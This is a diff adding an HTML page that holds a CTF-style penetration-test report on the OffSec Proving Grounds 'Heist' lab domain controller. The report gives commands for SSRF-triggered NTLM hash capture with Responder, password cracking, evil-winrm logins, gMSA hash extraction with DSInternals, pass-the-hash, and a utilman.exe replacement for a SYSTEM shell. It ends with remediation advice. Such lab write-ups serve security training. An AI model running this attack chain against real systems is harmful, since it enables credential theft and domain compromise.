@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>OffSec PG Heist | OSCP-Style Report</title>
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- FontAwesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            'cyber-black': '#0b1020',
+            'cyber-gray': '#0f1733',
+            'cyber-green': '#5eead4',
+            'cyber-green-dim': 'rgba(94, 234, 212, 0.1)',
+            'cyber-purple': '#a78bfa',
+            'cyber-red': '#ff003c',
+          },
+          fontFamily: {
+            mono: ['"Fira Code"', 'monospace'],
+            tech: ['"Share Tech Mono"', 'monospace'],
+          },
+          boxShadow: {
+            'neon': '0 0 10px rgba(94, 234, 212, 0.5), 0 0 20px rgba(94, 234, 212, 0.3)',
+          }
+        }
+      }
+    }
+  </script>
+
+  <style>
+    ::-webkit-scrollbar { width: 8px; }
+    ::-webkit-scrollbar-track { background: #0b1020; }
+    ::-webkit-scrollbar-thumb { background: #23305f; border-radius: 4px; }
+    ::-webkit-scrollbar-thumb:hover { background: #5eead4; }
+    .bg-grid {
+      background-size: 40px 40px;
+      background-image: linear-gradient(to right, rgba(94, 234, 212, 0.05) 1px, transparent 1px),
+                        linear-gradient(to bottom, rgba(167, 139, 250, 0.05) 1px, transparent 1px);
+    }
+    .terminal {
+      background: rgba(0,0,0,0.35);
+      border: 1px solid #23305f;
+      border-radius: 12px;
+      padding: 14px;
+      overflow-x: auto;
+      box-shadow: 0 0 0 rgba(0,0,0,0);
+    }
+    .terminal pre {
+      margin: 0;
+      white-space: pre;
+      font-size: 0.9rem;
+      line-height: 1.35rem;
+      color: #d1d5db;
+    }
+    .kbd {
+      border: 1px solid #23305f;
+      background: rgba(26,35,66,0.8);
+      padding: 2px 8px;
+      border-radius: 10px;
+      font-size: 0.8rem;
+      color: #e5e7eb;
+    }
+    /* Image modal */
+    #imgModal { display: none; }
+    #imgModal.active { display: flex; }
+    #imgModal {
+      position: fixed;
+      inset: 0;
+      align-items: center;
+      justify-content: center;
+      background: rgba(5,8,18,0.75);
+      z-index: 60;
+      padding: 1.5rem;
+    }
+    #imgModal .modal-inner {
+      max-width: 95%;
+      max-height: 95%;
+      display: flex;
+      flex-direction: column;
+      gap: 0.5rem;
+      align-items: center;
+    }
+    #imgModal img {
+      max-width: 100%;
+      max-height: 85vh;
+      border-radius: 8px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.6);
+    }
+    #imgModal .caption {
+      color: #cbd5e1;
+      font-size: 0.85rem;
+      text-align: center;
+      max-width: 90%;
+      word-break: break-word;
+    }
+    #imgModal .close-btn {
+      position: absolute;
+      top: 1rem;
+      right: 1rem;
+      background: rgba(35,48,95,0.8);
+      color: #e6eef2;
+      border: 1px solid #23305f;
+      padding: 0.4rem 0.6rem;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+  </style>
+
+</head>
+<body class="bg-cyber-black text-gray-300 font-mono relative overflow-x-hidden min-h-screen flex flex-col">
+
+  <!-- Background Overlay -->
+  <div class="fixed inset-0 bg-grid pointer-events-none z-0"></div>
+
+  <!-- Navbar -->
+  <nav class="fixed w-full z-50 bg-cyber-black/90 backdrop-blur-md border-b border-[#23305f]">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="flex items-center justify-between h-16">
+        <div class="flex-shrink-0">
+          <a href="/index.html" class="text-2xl font-bold text-cyber-green font-tech tracking-wider">&lt;josh/&gt;</a>
+        </div>
+        <div class="flex items-center gap-3">
+          <a href="/reports.html" class="flex items-center text-gray-300 hover:text-white transition-colors">
+            <i class="fas fa-arrow-left mr-2"></i> Back to Reports
+          </a>
+        </div>
+      </div>
+    </div>
+  </nav>
+
+  <main class="relative z-10 pt-32 pb-20 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex-grow">
+    <header class="mb-10">
+      <h1 class="text-4xl md:text-5xl font-bold text-white mb-4">
+        <span class="text-cyber-green">./</span> OffSec Proving Grounds — Heist
+      </h1>
+      <div class="flex flex-wrap items-center gap-2">
+        <span class="text-xs bg-green-900/30 text-green-300 border border-green-900 px-2 py-1 rounded whitespace-nowrap">CTF</span>
+        <span class="text-xs bg-[#1a2342] text-gray-200 border border-[#23305f] px-2 py-1 rounded whitespace-nowrap">OSCP-Style Report</span>
+        <span class="text-xs text-gray-500 whitespace-nowrap">Target: DC01.heist.offsec (192.168.234.165)</span>
+      </div>
+      <p class="text-gray-400 mt-4 max-w-3xl">
+        Full kill-chain: TCP/8080 web app → SSRF → NTLMv2 capture (Responder) → offline crack (Hashcat) → WinRM as <span class="text-white">enox</span> → extract gMSA <span class="text-white">svc_apache$</span> NTLM → WinRM as <span class="text-white">svc_apache$</span> → SeRestorePrivilege utilman.exe replacement → SYSTEM via RDP login screen → flags.
+      </p>
+    </header>
+
+    <section class="mb-10 bg-cyber-gray border border-[#23305f] rounded-lg p-6">
+      <h2 class="text-2xl font-bold text-white mb-4">Executive Summary</h2>
+      <p class="text-gray-300 leading-relaxed">
+        The target exposed a custom web application on TCP/8080 that performed server-side URL fetching. By providing an attacker-controlled URL, the application triggered outbound NTLM authentication from the server, allowing capture of a NetNTLMv2 challenge/response. The captured hash was cracked offline to recover valid domain user credentials for <span class="text-white">HEIST&#92;enox</span>.
+      </p>
+      <p class="text-gray-300 leading-relaxed mt-3">
+        After gaining remote access via WinRM, Active Directory was queried to locate a Group Managed Service Account (gMSA) named <span class="text-white">svc_apache$</span>. The managed password blob was retrieved and converted into an NTLM hash using DSInternals, enabling authentication as the gMSA. The gMSA account possessed <span class="text-white">SeRestorePrivilege</span>, which was abused to replace <span class="text-white">utilman.exe</span> with <span class="text-white">cmd.exe</span>. This allowed SYSTEM command execution from the Windows login screen and successful retrieval of both flags.
+      </p>
+    </section>
+
+    <section class="mb-10 bg-cyber-gray border border-[#23305f] rounded-lg p-6">
+      <h2 class="text-2xl font-bold text-white mb-4">Scope & Target Information</h2>
+      <div class="overflow-x-auto">
+        <table class="w-full text-sm">
+          <thead>
+            <tr class="text-left text-gray-400 border-b border-[#23305f]">
+              <th class="py-2 pr-4">Item</th>
+              <th class="py-2">Value</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr class="border-b border-[#23305f]/60"><td class="py-2 pr-4 text-gray-300">Target IP</td><td class="py-2 text-white">192.168.234.165</td></tr>
+            <tr class="border-b border-[#23305f]/60"><td class="py-2 pr-4 text-gray-300">Hostname</td><td class="py-2 text-white">DC01.heist.offsec</td></tr>
+            <tr class="border-b border-[#23305f]/60"><td class="py-2 pr-4 text-gray-300">Domain</td><td class="py-2 text-white">heist.offsec (NetBIOS: HEIST)</td></tr>
+            <tr><td class="py-2 pr-4 text-gray-300">Tester</td><td class="py-2 text-white">Josh</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <section class="mb-10 bg-cyber-gray border border-[#23305f] rounded-lg p-6" id="enumeration">
+      <h2 class="text-2xl font-bold text-white mb-4">1. Enumeration</h2>
+      <p class="text-gray-300 leading-relaxed mb-4">
+        Initial port scanning identified a web service running on TCP/8080. Further scanning confirmed the host is a Domain Controller with typical AD services (Kerberos/LDAP/SMB) and WinRM enabled.
+      </p>
+      <div class="bg-cyber-black border border-[#23305f] rounded-lg p-4">
+        <div class="text-gray-200 font-bold mb-2"><i class="fas fa-terminal text-cyber-green mr-2"></i>Nmap (key services)</div>
+        <pre class="text-xs md:text-sm text-gray-300 overflow-x-auto"><code>53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec)
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
+8080/tcp  open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
+</code></pre>
+      </div>
+    </section>
+
+    <section class="mb-10 bg-cyber-gray border border-[#23305f] rounded-lg p-6" id="ssrf">
+      <h2 class="text-2xl font-bold text-white mb-4">2. Initial Access — SSRF Validation and NTLMv2 Capture</h2>
+      <p class="text-gray-300 leading-relaxed">
+        Visiting the TCP/8080 site revealed an input field that generates server-side requests in the form <span class="text-white">http://&lt;TARGET&gt;:8080/?url=&lt;value&gt;</span>. To confirm SSRF, the value was replaced with an attacker-controlled URL.
+      </p>
+
+      <div class="mt-4 bg-cyber-black border border-[#23305f] rounded-lg p-4">
+        <div class="text-gray-200 font-bold mb-2"><i class="fas fa-terminal text-cyber-green mr-2"></i>Responder Listener</div>
+        <pre class="text-xs md:text-sm text-gray-300 overflow-x-auto"><code>sudo responder -I tun0 -dwv</code></pre>
+      </div>
+
+      <div class="mt-4 bg-cyber-black border border-[#23305f] rounded-lg p-4">
+        <div class="text-gray-200 font-bold mb-2"><i class="fas fa-terminal text-cyber-green mr-2"></i>SSRF Trigger</div>
+        <pre class="text-xs md:text-sm text-gray-300 overflow-x-auto"><code>http://192.168.234.165:8080/?url=http://&lt;KALI_TUN0_IP&gt;/</code></pre>
+      </div>
+
+      <p class="text-gray-300 leading-relaxed mt-4">
+        After pressing Enter, the application fetched the provided URL server-side and initiated NTLM authentication to the attacker listener. Responder captured a NetNTLMv2 challenge/response belonging to <span class="text-white">HEIST&#92;enox</span>.
+      </p>
+
+      <figure class="mt-5 bg-cyber-black border border-[#23305f] rounded-lg p-3">
+        <img class="rounded cursor-zoom-in zoomable" src="images/reponder_catch_ntlmhash.png" alt="Responder capturing NetNTLMv2" />
+        <figcaption class="text-xs text-gray-400 mt-2">Responder output showing captured NetNTLMv2 for <span class="text-white">HEIST&#92;enox</span>.</figcaption>
+      </figure>
+
+      <div class="mt-4 bg-cyber-black border border-[#23305f] rounded-lg p-4">
+        <div class="text-gray-200 font-bold mb-2"><i class="fas fa-terminal text-cyber-green mr-2"></i>Captured Hash (NetNTLMv2)</div>
+        <pre class="text-xs md:text-sm text-gray-300 overflow-x-auto"><code>enox::HEIST:5a7133d1ff812fb4:1771E887C3501F7923B9A8948C0A6BE1:0101000000000000B902B0F22E7EDC015B627BC3A72732560000000002000800460049004D004D0001001E00570049004E002D005700470051004100370058005A00520051004500580004001400460049004D004D002E004C004F00430041004C0003003400570049004E002D005700470051004100370058005A0052005100450058002E00460049004D004D002E004C004F00430041004C0005001400460049004D004D002E004C004F00430041004C0008003000300000000000000000000000003000003D26B6226A6003CBF24048D56181A122F67E7934A74378295CA2A475A9A2964D0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003100380034000000000000000000</code></pre>
+      </div>
+    </section>
+
+    <section class="mb-10 bg-cyber-gray border border-[#23305f] rounded-lg p-6" id="crack">
+      <h2 class="text-2xl font-bold text-white mb-4">3. Credential Access — Cracking NetNTLMv2 (enox)</h2>
+      <p class="text-gray-300 leading-relaxed">
+        The captured NetNTLMv2 hash was cracked offline with Hashcat using a wordlist attack. This recovered valid domain credentials.
+      </p>
+
+      <div class="mt-4 bg-cyber-black border border-[#23305f] rounded-lg p-4">
+        <div class="text-gray-200 font-bold mb-2"><i class="fas fa-terminal text-cyber-green mr-2"></i>Recovered Credentials</div>
+        <pre class="text-xs md:text-sm text-gray-300 overflow-x-auto"><code>enox : california</code></pre>
+      </div>
+
+      <figure class="mt-5 bg-cyber-black border border-[#23305f] rounded-lg p-3">
+        <img class="rounded cursor-zoom-in zoomable" src="images/hash_decrypt.png" alt="Hashcat crack result" />
+        <figcaption class="text-xs text-gray-400 mt-2">Hashcat output confirming cracked password for <span class="text-white">enox</span>: <span class="text-white">california</span>.</figcaption>
+      </figure>
+    </section>
+
+    <section class="mb-10 bg-cyber-gray border border-[#23305f] rounded-lg p-6" id="winrm">
+      <h2 class="text-2xl font-bold text-white mb-4">4. Remote Access — WinRM Login (enox)</h2>
+      <p class="text-gray-300 leading-relaxed">
+        Using the recovered credentials, a WinRM session was established on TCP/5985.
+      </p>
+
+      <div class="mt-4 bg-cyber-black border border-[#23305f] rounded-lg p-4">
+        <div class="text-gray-200 font-bold mb-2"><i class="fas fa-terminal text-cyber-green mr-2"></i>Command</div>
+        <pre class="text-xs md:text-sm text-gray-300 overflow-x-auto"><code>evil-winrm -i 192.168.234.165 -u enox -p california</code></pre>
+      </div>
+
+      <figure class="mt-5 bg-cyber-black border border-[#23305f] rounded-lg p-3">
+        <img class="rounded cursor-zoom-in zoomable" src="images/login_evil_winrm.png" alt="Evil-WinRM login" />
+        <figcaption class="text-xs text-gray-400 mt-2">Successful WinRM session as <span class="text-white">HEIST&#92;enox</span>.</figcaption>
+      </figure>
+    </section>
+
+    <section class="mb-10 bg-cyber-gray border border-[#23305f] rounded-lg p-6" id="gmsa">
+      <h2 class="text-2xl font-bold text-white mb-4">5. Credential Access — Extract gMSA NTLM Hash (svc_apache$)</h2>
+      <p class="text-gray-300 leading-relaxed">
+        The next objective was extracting the Group Managed Service Account (gMSA) <span class="text-white">svc_apache$</span>.
+        DSInternals was uploaded to the host to convert the gMSA managed password blob (<span class="text-white">msDS-ManagedPassword</span>) into an NTLM hash.
+      </p>
+
+      <div class="mt-4 bg-cyber-black border border-[#23305f] rounded-lg p-4">
+        <div class="text-gray-200 font-bold mb-2"><i class="fas fa-terminal text-cyber-green mr-2"></i>Upload & Extract DSInternals</div>
+        <pre class="text-xs md:text-sm text-gray-300 overflow-x-auto"><code>upload DSInternals.zip
+Expand-Archive .\DSInternals.zip -DestinationPath .\DSI -Force</code></pre>
+      </div>
+
+      <figure class="mt-5 bg-cyber-black border border-[#23305f] rounded-lg p-3">
+        <img class="rounded cursor-zoom-in zoomable" src="images/DSInternals_upload.png" alt="DSInternals upload and extraction" />
+        <figcaption class="text-xs text-gray-400 mt-2">DSInternals uploaded and extracted on the target.</figcaption>
+      </figure>
+
+      <div class="mt-4 bg-cyber-black border border-[#23305f] rounded-lg p-4">
+        <div class="text-gray-200 font-bold mb-2"><i class="fas fa-terminal text-cyber-green mr-2"></i>Extract and Convert gMSA Password Blob</div>
+        <pre class="text-xs md:text-sm text-gray-300 overflow-x-auto"><code>Import-Module .\DSInternals.psd1
+Import-Module ActiveDirectory
+
+$mp = (Get-ADServiceAccount -Identity svc_apache -Properties 'msDS-ManagedPassword').'msDS-ManagedPassword'
+$g  = ConvertFrom-ADManagedPasswordBlob $mp
+ConvertTo-NTHash $g.SecureCurrentPassword
+
+# NTLM (svc_apache$): 9943473ce1243e91129513bb932e9c90</code></pre>
+      </div>
+
+      <figure class="mt-5 bg-cyber-black border border-[#23305f] rounded-lg p-3">
+        <img class="rounded cursor-zoom-in zoomable" src="images/getting_svc_apache$_password_hash.png" alt="svc_apache$ NTLM extraction" />
+        <figcaption class="text-xs text-gray-400 mt-2">Extracted gMSA NTLM hash for <span class="text-white">svc_apache$</span>: <span class="text-white">9943473ce1243e91129513bb932e9c90</span>.</figcaption>
+      </figure>
+
+      <figure class="mt-5 bg-cyber-black border border-[#23305f] rounded-lg p-3">
+        <img class="rounded cursor-zoom-in zoomable" src="images/DSInternals.png" alt="DSInternals directory listing" />
+        <figcaption class="text-xs text-gray-400 mt-2">DSInternals module present on disk and ready for use.</figcaption>
+      </figure>
+    </section>
+
+    <section class="mb-10 bg-cyber-gray border border-[#23305f] rounded-lg p-6" id="svc_login">
+      <h2 class="text-2xl font-bold text-white mb-4">6. Remote Access — WinRM as svc_apache$ (Pass-the-Hash)</h2>
+      <p class="text-gray-300 leading-relaxed">
+        Authentication was performed as <span class="text-white">svc_apache$</span> using the extracted NTLM hash.
+      </p>
+
+      <div class="mt-4 bg-cyber-black border border-[#23305f] rounded-lg p-4">
+        <div class="text-gray-200 font-bold mb-2"><i class="fas fa-terminal text-cyber-green mr-2"></i>Command</div>
+        <pre class="text-xs md:text-sm text-gray-300 overflow-x-auto"><code>evil-winrm -i 192.168.234.165 -u svc_apache$ -H 9943473ce1243e91129513bb932e9c90</code></pre>
+      </div>
+    </section>
+
+    <section class="mb-10 bg-cyber-gray border border-[#23305f] rounded-lg p-6" id="privesc">
+      <h2 class="text-2xl font-bold text-white mb-4">7. Privilege Escalation — SeRestorePrivilege (utilman.exe Replacement)</h2>
+      <p class="text-gray-300 leading-relaxed">
+        The gMSA account possessed <span class="text-white">SeRestorePrivilege</span>. This privilege can be abused to overwrite protected system binaries.
+        The binary <span class="text-white">utilman.exe</span> is callable from the Windows login screen using <span class="text-white">Win + U</span>.
+        Replacing it with <span class="text-white">cmd.exe</span> results in a SYSTEM command prompt when triggered from the login screen.
+      </p>
+
+      <div class="mt-4 bg-cyber-black border border-[#23305f] rounded-lg p-4">
+        <div class="text-gray-200 font-bold mb-2"><i class="fas fa-terminal text-cyber-green mr-2"></i>Verify Privileges</div>
+        <pre class="text-xs md:text-sm text-gray-300 overflow-x-auto"><code>whoami /priv
+
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</code></pre>
+      </div>
+
+      <figure class="mt-5 bg-cyber-black border border-[#23305f] rounded-lg p-3">
+        <img class="rounded cursor-zoom-in zoomable" src="images/serestorepriv.png" alt="SeRestorePrivilege enabled" />
+        <figcaption class="text-xs text-gray-400 mt-2">Privilege check confirming <span class="text-white">SeRestorePrivilege</span> is enabled for <span class="text-white">svc_apache$</span>.</figcaption>
+      </figure>
+
+      <div class="mt-4 bg-cyber-black border border-[#23305f] rounded-lg p-4">
+        <div class="text-gray-200 font-bold mb-2"><i class="fas fa-terminal text-cyber-green mr-2"></i>Replace utilman.exe with cmd.exe</div>
+        <pre class="text-xs md:text-sm text-gray-300 overflow-x-auto"><code>cmd /c copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe</code></pre>
+      </div>
+
+      <p class="text-gray-300 leading-relaxed mt-4">
+        An RDP session was opened to reach the login screen (rdesktop was used in this engagement), then <span class="text-white">Win + U</span> was used to spawn a SYSTEM shell.
+        From the SYSTEM shell, flags were collected.
+      </p>
+
+      <div class="mt-4 bg-cyber-black border border-[#23305f] rounded-lg p-4">
+        <div class="text-gray-200 font-bold mb-2"><i class="fas fa-terminal text-cyber-green mr-2"></i>RDP (login screen access)</div>
+        <pre class="text-xs md:text-sm text-gray-300 overflow-x-auto"><code>rdesktop 192.168.234.165</code></pre>
+      </div>
+
+      <figure class="mt-5 bg-cyber-black border border-[#23305f] rounded-lg p-3">
+        <img class="rounded cursor-zoom-in zoomable" src="images/hashes.png" alt="SYSTEM shell and flags" />
+        <figcaption class="text-xs text-gray-400 mt-2">SYSTEM shell and flag retrieval.</figcaption>
+      </figure>
+    </section>
+
+    <section class="mb-10 bg-cyber-gray border border-[#23305f] rounded-lg p-6" id="flags">
+      <h2 class="text-2xl font-bold text-white mb-4">8. Flags</h2>
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <div class="bg-cyber-black border border-[#23305f] rounded-lg p-4">
+          <div class="text-xs text-gray-400">local.txt</div>
+          <div class="mt-2 font-bold text-white break-all">d984753c597250e8d896b2c2ada276a3</div>
+          <div class="text-xs text-gray-500 mt-2">C:\Users\enox\Desktop\local.txt</div>
+        </div>
+        <div class="bg-cyber-black border border-[#23305f] rounded-lg p-4">
+          <div class="text-xs text-gray-400">proof.txt</div>
+          <div class="mt-2 font-bold text-white break-all">2b4babbab70bb1850f3d5a580fa251a</div>
+          <div class="text-xs text-gray-500 mt-2">C:\Users\Administrator\Desktop\proof.txt</div>
+        </div>
+      </div>
+    </section>
+
+    <section class="bg-cyber-gray border border-[#23305f] rounded-lg p-6" id="recommendations">
+      <h2 class="text-2xl font-bold text-white mb-4">Remediation</h2>
+      <ul class="text-gray-300 space-y-2 list-disc pl-5">
+        <li>Implement SSRF protections: strict allowlists, deny private ranges, block redirects, and validate DNS resolution.</li>
+        <li>Restrict outbound authentication to untrusted hosts and harden NTLM settings (minimize/disable NTLM where possible).</li>
+        <li>Harden ACLs on gMSA password attributes (msDS-ManagedPassword) and limit who can read managed passwords.</li>
+        <li>Remove SeRestorePrivilege from non-admin principals; monitor and alert on changes to System32 binaries (including utilman.exe).</li>
+        <li>Limit exposure of administrative services (WinRM/RDP) and enforce MFA/conditional access where applicable.</li>
+      </ul>
+    </section>
+  </main>
+
+  <!-- Footer (Added to match reports.html) -->
+  <footer class="bg-black border-t border-[#23305f] py-8 mt-auto relative">
+    <div class="max-w-7xl mx-auto px-4 text-center">
+      <p class="text-gray-600 text-sm font-mono">
+        &copy; 2025 Josh Chalabi. <span class="text-cyber-green">Secure by Design.</span>
+      </p>
+    </div>
+  </footer>
+
+  <!-- Image Modal -->
+  <div id="imgModal" role="dialog" aria-modal="true" tabindex="-1" aria-hidden="true">
+    <button class="close-btn" aria-label="Close image (Esc)">✕</button>
+    <div class="modal-inner">
+      <img id="modalImg" src="" alt="" />
+      <div class="caption" id="modalCaption"></div>
+    </div>
+  </div>
+
+  <script>
+    // Simple zoomable image modal
+    (function () {
+      const modal = document.getElementById('imgModal');
+      const modalImg = document.getElementById('modalImg');
+      const modalCaption = document.getElementById('modalCaption');
+      const closeBtn = modal.querySelector('.close-btn');
+
+      function openModal(img) {
+        modalImg.src = img.src;
+        modalImg.alt = img.alt || '';
+        // If a sibling figcaption exists, use it; otherwise use img.alt
+        const fig = img.closest('figure');
+        const figcap = fig ? fig.querySelector('figcaption') : null;
+        modalCaption.textContent = figcap ? figcap.textContent.trim() : (img.alt || '');
+        modal.classList.add('active');
+        modal.setAttribute('aria-hidden', 'false');
+        document.body.style.overflow = 'hidden';
+      }
+
+      function closeModal() {
+        modal.classList.remove('active');
+        modal.setAttribute('aria-hidden', 'true');
+        modalImg.src = '';
+        document.body.style.overflow = '';
+      }
+
+      document.querySelectorAll('img.zoomable').forEach(img => {
+        img.style.cursor = 'zoom-in';
+        img.addEventListener('click', () => openModal(img));
+      });
+
+      modal.addEventListener('click', (e) => {
+        if (e.target === modal || e.target === closeBtn) closeModal();
+      });
+
+      document.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape' && modal.classList.contains('active')) closeModal();
+      });
+    })();
+  </script>
+</body>
+</html>
